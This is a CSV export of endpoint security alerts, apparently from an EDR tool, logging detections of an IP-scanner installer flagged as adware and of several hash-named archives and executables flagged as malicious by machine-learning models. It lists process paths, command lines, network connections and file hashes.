Hostname,OS_Version,Severity,Confidence,Tactic,Technique,Description,Process_Name,Process_Path,Command_Line,User_Name,Parent_Process,Parent_Command_Line,Files_Accessed,Files_Written,IOCs,Network_Accesses,SHA256,MD5
****,Windows 11,Low,100,Malware,PUP,A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.,msedge.exe,\Device\HarddiskVolume7\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --single-argument microsoft-edge:?url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3Dangry%2Bip%2Bscanner%26form%3DWSBEDG%26qs%3DLT%26cvid%3D26a3753cf2bf46cd90553a000b7a397b%26pq%3Dangry%26cc%3DLK%26setlang%3Den-US%26nclid%3DE4A68D2F4BF55F080B5F5842E2A3D265%26ts%3D1748337130412%26nclidts%3D1748337130%26tsms%3D412%26wsso%3DModerate&timestamp=1748337130416&source=WindowsSearchBox&campaign=addedgeprot&medium=AutoSuggest&oid=u%3A430fae35-d39b-4855-a08b-355c3c882b07.44e3cf94-19c9-4e32-96c3-14f5bf01391a&upn=it20614294%40my.sliit.lk",****,sihost.exe,sihost.exe,,ipscan-3.9.1-setup.exe (\Device\HarddiskVolume7\Users\mdwis\Downloads),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,224.0.0.251:5353 (UDP);ff02:0:0:0:0:0:0:fb:5353 (UDP),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849 (\Device\HarddiskVolume7\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Downloads\41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add (\Device\HarddiskVolume7\Users\mdwis\Downloads\41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add),41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add,,41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,Low,100,Malware,PUP,This file is classified as Adware/PUP based on its SHA256 hash.,ipscan-3.9.1-setup.exe,\Device\HarddiskVolume7\Users\mdwis\Downloads\ipscan-3.9.1-setup.exe,"""C:\Users\mdwis\Downloads\ipscan-3.9.1-setup.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,,892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,,892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,Low,100,Malware,PUP,A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.,msedge.exe,\Device\HarddiskVolume7\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --single-argument microsoft-edge:?url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3Dangry%2Bip%2Bscanner%2Bdownload%26form%3DWSBEDG%26qs%3DMT%26cvid%3D1a54be18405d45b78367ca153a8fd7f4%26pq%3Dangry%2Bip%2Bscanner%26cc%3DLK%26setlang%3Den-US%26nclid%3DE4A68D2F4BF55F080B5F5842E2A3D265%26ts%3D1745822796611%26nclidts%3D1745822796%26tsms%3D611%26wsso%3DModerate&timestamp=1745822796613&source=WindowsSearchBox&campaign=addedgeprot&medium=AutoSuggest&oid=u%3A430fae35-d39b-4855-a08b-355c3c882b07.44e3cf94-19c9-4e32-96c3-14f5bf01391a&upn=it20614294%40my.sliit.lk",****,sihost.exe,sihost.exe,,ipscan-3.9.1-setup.exe (\Device\HarddiskVolume7\Users\mdwis\Downloads),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,224.0.0.251:5353 (UDP);ff02:0:0:0:0:0:0:fb:5353 (UDP),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,Low,100,Malware,PUP,A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.,msedge.exe,\Device\HarddiskVolume7\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --always-read-main-dll --field-trial-handle=2252,i,10893692767256603793,17799270140690513196,262144 --variations-seed-version --mojo-platform-channel-handle=2456 /prefetch:11",****,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --single-argument microsoft-edge:?url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3Dangry%2Bip%2Bscanner%2Bdownload%26form%3DWSBEDG%26qs%3DMT%26cvid%3D1a54be18405d45b78367ca153a8fd7f4%26pq%3Dangry%2Bip%2Bscanner%26cc%3DLK%26setlang%3Den-US%26nclid%3DE4A68D2F4BF55F080B5F5842E2A3D265%26ts%3D1745822796611%26nclidts%3D1745822796%26tsms%3D611%26wsso%3DModerate&timestamp=1745822796613&source=WindowsSearchBox&campaign=addedgeprot&medium=AutoSuggest&oid=u%3A430fae35-d39b-4855-a08b-355c3c882b07.44e3cf94-19c9-4e32-96c3-14f5bf01391a&upn=it20614294%40my.sliit.lk",,f_0001c9 (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Microsoft\Edge\User Data\Profile 1\Cache\Cache_Data),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,74.125.130.99:443 (UDP);23.212.254.9:443 (TCP);142.251.10.132:443 (TCP);142.251.12.94:443 (TCP);104.88.70.184:443 (TCP);10.1.0.80:53 (UDP);142.251.10.100:443 (TCP);10.40.87.90:8009 (TCP);185.199.110.133:443 (TCP);20.205.243.166:443 (TCP),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 10,High,,Machine Learning,Sensor-based ML,,payload.exe,E:\payload.exe,,****,,,,,,,394a141d547731cd00a1be936e87235a1a526189fb6147505a30ff7311a2cb64,
****,Windows 11,High,70,Machine Learning,Cloud-based ML,"A file written to the file-system meets the cloud-based machine learning model high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume3\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""D:\Users\deshan.fernando\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000067.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Caches);IconCache.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local);iconcache_16.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Explorer);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop);rarreg.key (\Device\HarddiskVolume3\Program Files\WinRAR);rarreg.key (\Device\HarddiskVolume3\Program Files\WinRAR);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop);cversions.1.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Caches);iconcache_idx.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Explorer),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop\CBC),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,iconcache_32.db (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Microsoft\Windows\Explorer);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume7\Users\mdwis\Desktop),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Temp\Rar$DIb17684.38276),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,80,AI Powered IOA,Malicious File,A process launched that meets the cloud-based behavioral machine learning model  threshold for malicious activity. Detection is based on execution pattern and on-sensor ML telemetry.,test.exe,\Device\HarddiskVolume4\Users\deshan.fernando\Desktop\CBC\test.exe,"""D:\Users\deshan.fernando\Desktop\CBC\test.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,,,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume7\Users\mdwis\Desktop);iconcache_32.db (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Microsoft\Windows\Explorer),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Temp\Rar$DIb17684.38276),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,0b114fc0f4b6d49f57b3b01dd9ea6a8c
